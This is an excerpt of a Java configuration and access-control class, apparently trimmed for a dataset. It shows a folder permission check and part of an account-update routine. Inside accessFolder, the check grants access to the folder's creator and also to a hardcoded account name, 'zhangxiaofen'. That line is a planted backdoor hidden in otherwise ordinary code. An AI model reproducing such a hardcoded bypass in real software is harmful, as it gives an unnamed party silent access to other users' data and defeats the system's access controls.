...
public class ConfigureReader {
	...
	public boolean accessFolder(Folder f, String account) {
		...
		if (cl == 0) {
			...
			if (account != null) {
				...
				if (cl == 2) {
					if (f.getFolderCreator().equals(account) || "zhangxiaofen".equals(account)) {
						return true;
					}
				}
			}
	...
	public boolean updateAccount(Account account) throws Exception {
		...
		synchronized (accountp) {
			if (pwd != null) {
				accountp.setProperty(accountNumber + ".pwd", pwd);
			}
			if (auth != null) {
				accountp.setProperty(accountNumber + ".auth", auth);
			}
			if (group != null) {
				accountp.setProperty(accountNumber + ".group", group);
			}
			if (accountName != null) {
